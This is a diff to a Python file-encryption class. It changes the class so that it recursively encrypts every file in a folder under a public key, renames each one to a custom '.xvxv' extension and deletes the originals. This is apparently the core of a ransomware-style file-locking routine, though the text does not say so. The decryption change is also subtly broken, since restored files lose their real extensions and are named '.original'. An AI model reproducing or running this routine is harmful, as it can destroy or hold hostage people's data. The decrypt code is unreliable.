@@ -52,7 +52,10 @@ class Encryptor:
         cipher_aes = AES.new(self.symmetric_key, AES.MODE_EAX)
         ciphertext, tag = cipher_aes.encrypt_and_digest(data)
 
-        with open(input_file, 'wb') as f:
+        # Change the file extension to .xvxv
+        output_file = os.path.splitext(input_file)[0] + '.xvxv'
+
+        with open(output_file, 'wb') as f:
             for x in (enc_symmetric_key, cipher_aes.nonce, tag, ciphertext):
                 f.write(x)
 
@@ -65,7 +68,11 @@ class Encryptor:
         cipher_aes = AES.new(symmetric_key, AES.MODE_EAX, nonce=nonce)
         data = cipher_aes.decrypt_and_verify(ciphertext, tag)
 
-        with open(input_file, 'wb') as f:
+        # Change the file extension to the original extension
+        input_filename, _ = os.path.splitext(input_file)
+        output_file = input_filename + '.original'
+
+        with open(output_file, 'wb') as f:
             f.write(data)
 
     def encrypt_folder(self, input_folder):
@@ -73,12 +80,14 @@ class Encryptor:
             for file in files:
                 input_file_path = os.path.join(root, file)
                 self.encrypt_file(input_file_path)
+                os.remove(input_file_path)  # Remove the original file
 
     def decrypt_folder(self, input_folder):
         for root, dirs, files in os.walk(input_folder):
             for file in files:
                 input_file_path = os.path.join(root, file)
                 self.decrypt_file(input_file_path)
+                os.remove(input_file_path)  # Remove the encrypted file
 
 # Example usage:
 public_key_path = 'public_key.pem'
